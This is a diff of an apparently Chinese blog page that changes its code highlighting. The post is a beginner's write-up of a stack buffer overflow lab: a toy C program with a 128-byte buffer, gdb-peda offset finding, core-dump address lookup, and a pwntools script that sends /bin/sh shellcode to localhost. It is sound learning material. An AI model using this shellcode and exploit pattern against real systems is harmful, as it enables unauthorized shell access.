@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -468,45 +469,93 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <p>代码是这个<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vunerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    vunerable_function();</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+        <p>代码是这个</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">void</span> <span class="token function">vunerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">vunerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>编译的时候关掉了一切保护措施<code>balabala -o level1</code></p>
 <p>然后</p>
 <ol>
-<li><p>打开gdb</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">haibin$: gdb ./level1</div></pre></td></tr></table></figure>
+<li>打开gdb<pre class="line-numbers language-bash"><code class="language-bash"> haibin$: gdb ./level1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
-<li><p>跑一个150长的字符串</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div></pre></td></tr></table></figure>
+<li>跑一个150长的字符串<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ pattern create 150
+ 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </li>
-<li><p>跑一下程序，把字符串输进去，得到崩溃时候的无效返回地址</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x41416d41 in ?? ()</div></pre></td></tr></table></figure>
-</li>
-<li><p>看看这个字符串<code>0x41416d41</code>(<code>AmAA</code>)在输入的哪个位置上(这里开始有疑问，后来明白了)</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset 0x41416d41</div></pre></td></tr></table></figure>
-<p> 或者</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset &apos;AmAA&apos;</div></pre></td></tr></table></figure>
-<p> 不是</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern offset &apos;AAmA&apos;</div></pre></td></tr></table></figure>
-<p> 哦<br> 因为这里是小端<code>0x41416d41</code>实际上意思是以此出现了<code>0x41</code>, <code>0x6d</code>, <code>0x41</code>, <code>0x41</code> ，从低的地方往高的地方数数哦,所以对应的是字符串<code>AmAA</code></p>
-</li>
-<li><p>得到了偏移量</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ pattern offset &apos;0x41416d41&apos;</div><div class="line">1094806849 found at offset: 140</div></pre></td></tr></table></figure>
+<li>跑一下程序，把字符串输进去，得到崩溃时候的无效返回地址<pre><code> Stopped reason: SIGSEGV
+ 0x41416d41 in ?? ()
+</code></pre></li>
+<li>看看这个字符串<code>0x41416d41</code>(<code>AmAA</code>)在输入的哪个位置上(这里开始有疑问，后来明白了)<pre><code> pattern offset 0x41416d41
+</code></pre> 或者<pre><code> pattern offset &#39;AmAA&#39;
+</code></pre> 不是<pre><code> pattern offset &#39;AAmA&#39;
+</code></pre> 哦<br> 因为这里是小端<code>0x41416d41</code>实际上意思是以此出现了<code>0x41</code>, <code>0x6d</code>, <code>0x41</code>, <code>0x41</code> ，从低的地方往高的地方数数哦,所以对应的是字符串<code>AmAA</code></li>
+<li>得到了偏移量<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ pattern offset '0x41416d41'
+ 1094806849 found at offset: 140
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </li>
 <li><p>接下来就是通过贮储文件得到正确的要跳转到的shellcode的位置，前面的过程相当于得知了shellcode的格式，即相对位置(shellcode + padding + ret) 其中shellcode和padding共长140，<code>ret</code>处填shellcode的起始位置，即为报错时候的<code>$esp - 140 -4</code>，但这是个相对位置，我们得得到程序运行时候的shellcode的绝对位置，就是栈上的某一块位置，本来的话，我们在调试的时候，出现<code>Stopped reason: SIGSEGV 0x41416d41 in ?? ()</code> 的时候就可以通过<code>x/10s $esp-144</code>就可以看到我们shellcode的地址</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/10s $esp-144</div><div class="line">0xffffcb50:	&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377&quot;</div></pre></td></tr></table></figure>
-</li>
-</ol>
+<pre class="line-numbers language-gdb"><code class="language-gdb"> gdb-peda$ x/10s $esp-144
+ 0xffffcb50:    "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>这里得到shellcode的地址为<code>0xffffcb50</code>,但实际上有个问题，据说gdb调试的时候会影响栈地址，和不用gdb的时候不一样，我的天，，，所以要正常运行程序生成贮储文件来找出正确的地址</p>
-<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">ulimit</span> -c unlimited</div><div class="line">sudo sh -c <span class="string">'echo "tmp/core.%t" &gt; /proc/sys/kernel/core_pattern'</span></div></pre></td></tr></table></figure>
-</code></pre><p>大概是设置转储文件名字格式<br>之后运行我们的程序，输入长字符串</p>
-<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">haibin$: ./level1</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....懒得帖了</div><div class="line">Segment fault(core dump)</div><div class="line">haibin$: gdb level1 /tmp/core.xxxxxxx</div><div class="line">....各种信息</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">\<span class="comment">#0  0x41416d41 in ?? ()</span></div><div class="line">gdb-peda$ x/10s <span class="variable">$esp</span>-144</div><div class="line">0xffffcb90:	<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"</span></div></pre></td></tr></table></figure>
-</code></pre><ol>
+<pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">ulimit</span> -c unlimited
+ <span class="token function">sudo</span> sh -c <span class="token string">'echo "tmp/core.%t" > /proc/sys/kernel/core_pattern'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>大概是设置转储文件名字格式<br>之后运行我们的程序，输入长字符串</p>
+<pre class="line-numbers language-bash"><code class="language-bash"> haibin$: ./level1
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="token punctuation">..</span><span class="token punctuation">..</span>.懒得帖了
+ Segment fault<span class="token punctuation">(</span>core dump<span class="token punctuation">)</span>
+ haibin$: gdb level1 /tmp/core.xxxxxxx
+ <span class="token punctuation">..</span><span class="token punctuation">..</span>各种信息
+ Program terminated with signal SIGSEGV, Segmentation fault.
+ \#0  0x41416d41 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+ gdb-peda$ x/10s <span class="token variable">$esp</span>-144
+ 0xffffcb90:    <span class="token string">"AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n\377"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
 <li><p>得到了我们要的地址<code>0xffffcb90</code>(这个地址确实和开gdb的不一样，开gdb的地址大概是<code>0xffffcb50</code>)，然后就能写poc了</p>
 </li>
 <li><p>写poc</p>
 </li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./level1')</span></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">123456</span>)</div><div class="line">ret = <span class="number">0xffffcb90</span>   </div><div class="line"></div><div class="line"><span class="comment">#md , shou qiao hao lei a,我从网上抄的shellcode，感觉好像其实不能用</span></div><div class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></div><div class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></div><div class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">payload = shellcode + <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode)) + p32(ret) <span class="comment"># 140 + 4 没毛病</span></div><div class="line"><span class="keyword">print</span> payload</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#|-----------payload---------|</span></div><div class="line"><span class="comment">#|---------------------------|</span></div><div class="line"><span class="comment">#|140 bytes          |4 bytes|</span></div><div class="line"><span class="comment">#|---------------------------|</span></div><div class="line"><span class="comment">#|shellcode + padding|ret    |</span></div><div class="line"><span class="comment">#|---------------------------|</span></div></pre></td></tr></table></figure>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token comment" spellcheck="true">#encoding: utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#p = process('./level1')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">123456</span><span class="token punctuation">)</span>
+ret <span class="token operator">=</span> <span class="token number">0xffffcb90</span>   
+
+<span class="token comment" spellcheck="true">#md , shou qiao hao lei a,我从网上抄的shellcode，感觉好像其实不能用</span>
+shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x0b\xcd\x80"</span>
+
+payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">140</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 140 + 4 没毛病</span>
+<span class="token keyword">print</span> payload
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token comment" spellcheck="true">#|-----------payload---------|</span>
+<span class="token comment" spellcheck="true">#|---------------------------|</span>
+<span class="token comment" spellcheck="true">#|140 bytes          |4 bytes|</span>
+<span class="token comment" spellcheck="true">#|---------------------------|</span>
+<span class="token comment" spellcheck="true">#|shellcode + padding|ret    |</span>
+<span class="token comment" spellcheck="true">#|---------------------------|</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol>
 <li>写好跑一下，应该就能getshell了，但我好像并没有成功，不知道为什么，但大概了解了整个过程</li>
 </ol>
